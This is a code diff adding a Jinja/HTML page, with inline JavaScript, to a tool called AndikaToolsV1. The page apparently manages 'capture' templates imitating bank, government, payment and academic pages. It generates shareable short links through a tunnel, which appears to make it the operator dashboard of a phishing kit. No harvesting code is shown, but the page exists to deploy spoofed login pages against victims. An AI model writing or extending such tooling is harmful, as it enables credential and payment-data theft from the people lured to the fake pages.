@@ -1,0 +1,169 @@
+{% extends "base_modern.html" %}
+{% set active = "templates" %}
+{% block title %}Templates - AndikaToolsV1{% endblock %}
+{% block head %}
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<style>
+.cat-filters { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:20px; }
+.cat-btn { padding:8px 16px; background:var(--bg-glass); backdrop-filter:blur(10px); border:1px solid var(--border-subtle); border-radius:20px; color:var(--text-secondary); font-size:12px; cursor:pointer; transition:var(--transition); font-family:inherit; }
+.cat-btn:hover { background:var(--bg-glass-hover); }
+.cat-btn.active { background:var(--gradient-primary); color:#fff; border-color:transparent; box-shadow:var(--shadow-glow); }
+.tpl-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:16px; }
+.tpl-card { background:var(--bg-glass); backdrop-filter:blur(20px); border:1px solid var(--border-subtle); border-radius:var(--radius-lg); overflow:hidden; transition:var(--transition); animation:fadeInUp 0.4s ease both; }
+.tpl-card:hover { transform:translateY(-4px); box-shadow:var(--shadow-lg); border-color:var(--border-strong); }
+.tpl-preview { height:180px; background:var(--bg-tertiary); overflow:hidden; position:relative; border-bottom:1px solid var(--border-subtle); }
+.tpl-preview iframe { width:180%; height:600px; border:none; pointer-events:none; transform:scale(0.55); transform-origin:top left; }
+.tpl-info { padding:16px; }
+.tpl-cat-tag { display:inline-block; font-size:10px; background:var(--bg-tertiary); color:var(--text-muted); padding:3px 10px; border-radius:10px; text-transform:uppercase; letter-spacing:0.5px; font-weight:600; margin-bottom:10px; }
+.tpl-name { font-size:16px; font-weight:700; color:var(--text-primary); margin:0 0 6px; }
+.tpl-desc { font-size:12px; color:var(--text-muted); margin:0 0 14px; line-height:1.5; }
+.tpl-actions { display:flex; gap:6px; }
+.tpl-actions .btn { flex:1; justify-content:center; padding:8px; font-size:12px; }
+.empty-state { text-align:center; padding:80px 20px; }
+.empty-state .icon { font-size:80px; margin-bottom:16px; opacity:0.5; }
+</style>
+{% endblock %}
+{% block content %}
+<div class="topbar">
+  <div class="topbar-title">
+    <h1>📚 Templates</h1>
+    <p>Pilih template halaman untuk capture</p>
+  </div>
+  <div class="topbar-actions">
+    <button class="btn btn-primary" onclick="initBuiltin()">🎁 Load Bawaan</button>
+    <button class="btn" onclick="loadTemplates()">🔄 Refresh</button>
+  </div>
+</div>
+
+<div class="cat-filters">
+  <button class="cat-btn active" data-cat="">Semua</button>
+  <button class="cat-btn" data-cat="academic">🎓 Akademik</button>
+  <button class="cat-btn" data-cat="general">🔒 Umum</button>
+  <button class="cat-btn" data-cat="bank">🏦 Bank</button>
+  <button class="cat-btn" data-cat="government">🏛️ Pemerintah</button>
+  <button class="cat-btn" data-cat="marketing">🎁 Marketing</button>
+  <button class="cat-btn" data-cat="payment">💳 Payment</button>
+</div>
+
+<div id="loading" style="text-align:center;padding:60px;color:var(--text-muted)">
+  <div style="font-size:40px;animation:spin 1s linear infinite;display:inline-block">⏳</div>
+  <p style="margin-top:12px">Memuat template...</p>
+</div>
+
+<div class="empty-state" id="empty" style="display:none">
+  <div class="icon">📚</div>
+  <h2 style="color:var(--text-primary);margin:0 0 8px">Belum Ada Template</h2>
+  <p style="color:var(--text-muted);margin-bottom:20px">Klik tombol "Load Bawaan"</p>
+  <button class="btn btn-primary" onclick="initBuiltin()">🎁 Load Template Bawaan</button>
+</div>
+
+<div class="tpl-grid" id="grid" style="display:none"></div>
+
+<script>
+var allTemplates = [];
+var currentCat = "";
+
+function escHtml(s) { if (s == null) return ""; return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;"); }
+
+function loadTemplates() {
+  document.getElementById("loading").style.display = "block";
+  document.getElementById("empty").style.display = "none";
+  document.getElementById("grid").style.display = "none";
+  fetch("/api/templates/list").then(r => r.json()).then(data => {
+    allTemplates = data;
+    document.getElementById("loading").style.display = "none";
+    if (!data.length) {
+      document.getElementById("empty").style.display = "block";
+    } else {
+      document.getElementById("grid").style.display = "grid";
+      renderGrid();
+    }
+  }).catch(e => {
+    document.getElementById("loading").innerHTML = "Error: " + e.message;
+  });
+}
+
+function renderGrid() {
+  var grid = document.getElementById("grid");
+  var list = allTemplates;
+  if (currentCat) list = list.filter(t => t.category === currentCat);
+  if (!list.length) {
+    grid.innerHTML = '<p style="color:var(--text-muted);text-align:center;padding:40px;grid-column:1/-1">Tidak ada template di kategori ini</p>';
+    return;
+  }
+  var catMap = { academic:"🎓 Akademik", general:"🔒 Umum", bank:"🏦 Bank", government:"🏛️ Pemerintah", marketing:"🎁 Marketing", payment:"💳 Payment" };
+  var html = "";
+  list.forEach(t => {
+    var catLabel = catMap[t.category] || t.category;
+    html += '<div class="tpl-card">' +
+      '<div class="tpl-preview"><iframe src="/t/' + t.id + '/preview" sandbox="allow-same-origin"></iframe></div>' +
+      '<div class="tpl-info">' +
+      '<div class="tpl-cat-tag">' + escHtml(catLabel) + '</div>' +
+      '<div class="tpl-name">' + escHtml(t.name) + '</div>' +
+      '<div class="tpl-desc">' + escHtml(t.description || "") + '</div>' +
+      '<div class="tpl-actions">' +
+      '<button class="btn btn-primary" onclick="useTemplate(' + t.id + ')">🚀 Pakai</button>' +
+      '<a class="btn" href="/t/' + t.id + '/preview" target="_blank">👁️</a>' +
+      '</div></div></div>';
+  });
+  grid.innerHTML = html;
+}
+
+document.querySelectorAll(".cat-btn").forEach(b => {
+  b.addEventListener("click", () => {
+    document.querySelectorAll(".cat-btn").forEach(x => x.classList.remove("active"));
+    b.classList.add("active");
+    currentCat = b.dataset.cat;
+    renderGrid();
+  });
+});
+
+async function useTemplate(id) {
+  var r = await Swal.fire({
+    title: "Nama Mode", input: "text", inputPlaceholder: "Contoh: Test 1",
+    showCancelButton: true, confirmButtonText: "🚀 Generate Link",
+    confirmButtonColor: "#6366f1", background: "#131829", color: "#f8fafc", cancelButtonText: "Batal",
+  });
+  if (!r.isConfirmed) return;
+  Swal.fire({ title: "Membuat link...", didOpen: () => Swal.showLoading(), allowOutsideClick: false, background: "#131829", color: "#f8fafc" });
+  try {
+    var res = await fetch("/api/templates/use/" + id, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ name: r.value || "" }),
+    });
+    var data = await res.json();
+    if (!data.ok) throw new Error(data.msg || "Gagal");
+    var status = data.using_tunnel ? '<p style="color:#10b981;font-weight:600">✅ Tunnel aktif</p>' : '<p style="color:#f59e0b">⚠️ Tunnel belum siap</p>';
+    var html = '<div style="text-align:left;font-size:13px">' + status +
+      '<p style="margin:12px 0 6px"><b>Link Template:</b></p>' +
+      '<input id="lk1" value="' + data.link_template + '" readonly style="width:100%;padding:10px;background:#0a0e1a;color:#6366f1;border:1px solid #1e293b;border-radius:8px;font-size:11px;box-sizing:border-box">' +
+      '<button onclick="copyT(\'lk1\')" style="margin-top:6px;padding:8px 16px;background:#6366f1;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">📋 Copy</button>' +
+      '<p style="margin:14px 0 6px"><b>Link Mode:</b></p>' +
+      '<input id="lk2" value="' + data.link_short + '" readonly style="width:100%;padding:10px;background:#0a0e1a;color:#6366f1;border:1px solid #1e293b;border-radius:8px;font-size:11px;box-sizing:border-box">' +
+      '<button onclick="copyT(\'lk2\')" style="margin-top:6px;padding:8px 16px;background:#1e293b;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px">📋 Copy</button></div>';
+    Swal.fire({ icon: "success", title: "🎉 Link Dibuat!", html: html, width: 560, background: "#131829", color: "#f8fafc", confirmButtonColor: "#6366f1" });
+  } catch (e) {
+    Swal.fire({ icon: "error", title: "Error", text: e.message, background: "#131829", color: "#f8fafc" });
+  }
+}
+
+function copyT(id) {
+  var el = document.getElementById(id);
+  navigator.clipboard.writeText(el.value);
+  Swal.fire({ toast: true, position: "top-end", icon: "success", title: "Copied!", timer: 1200, showConfirmButton: false, background: "#131829", color: "#f8fafc" });
+}
+
+async function initBuiltin() {
+  Swal.fire({ title: "Loading...", didOpen: () => Swal.showLoading(), allowOutsideClick: false, background: "#131829", color: "#f8fafc" });
+  try {
+    var res = await fetch("/api/templates/init-builtin", { method: "POST" });
+    var data = await res.json();
+    Swal.fire({ icon: "success", title: data.created + " template dimuat", timer: 1500, showConfirmButton: false, background: "#131829", color: "#f8fafc" });
+    loadTemplates();
+  } catch (e) { Swal.fire({ icon: "error", title: "Error", text: e.message, background: "#131829", color: "#f8fafc" }); }
+}
+
+loadTemplates();
+</script>
+{% endblock %}
